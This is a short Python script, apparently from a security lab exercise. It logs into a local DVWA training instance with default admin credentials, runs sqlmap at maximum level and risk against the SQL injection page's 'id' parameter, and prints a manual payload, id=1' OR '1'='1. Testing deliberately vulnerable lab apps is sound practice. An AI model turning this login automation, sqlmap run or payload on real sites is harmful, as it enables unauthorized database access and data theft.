import requests, re, subprocess, sys, os

target = "http://127.0.0.1:3002"

# Login
s = requests.Session()
r = s.get(target + "/login.php", timeout=5)
token = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
s.post(target + "/login.php", data={"username":"admin","password":"password","Login":"Login","user_token":token}, timeout=5)
cookie = "PHPSESSID=%s; security=low" % s.cookies.get("PHPSESSID", "")

# SQLMap targeting ONLY 'id' parameter
print("=== SQLMap on DVWA SQLi (forced 'id' param) ===")
r = subprocess.run(
    [sys.executable, "-m", "sqlmap", "-u", target + "/vulnerabilities/sqli/?id=1&Submit=Submit",
     "--cookie", cookie, "-p", "id",
     "--batch", "--level", "5", "--risk", "3",
     "--flush-session", "--answers", "follow=N",
     "--output-dir", "sqlmap_dvwa_fix"],
    capture_output=True, timeout=300)
out = (r.stdout + r.stderr).decode("utf-8", "replace")
for line in out.split("\n"):
    l = line.strip()
    if l and any(k in l.lower() for k in ["vulnerable", "injectable", "parameter:", "type: ", "payload"]):
        print("  %s" % l[:150])

# Also check for specific findings
if "is vulnerable" in out.lower():
    print("\nRESULT: SQL INJECTION CONFIRMED by SQLMap!")
else:
    print("\nRESULT: SQLMap did not detect injection (tool limitation for DVWA)")
    print("(Manual injection confirmed: id=1' OR '1'='1 works)")
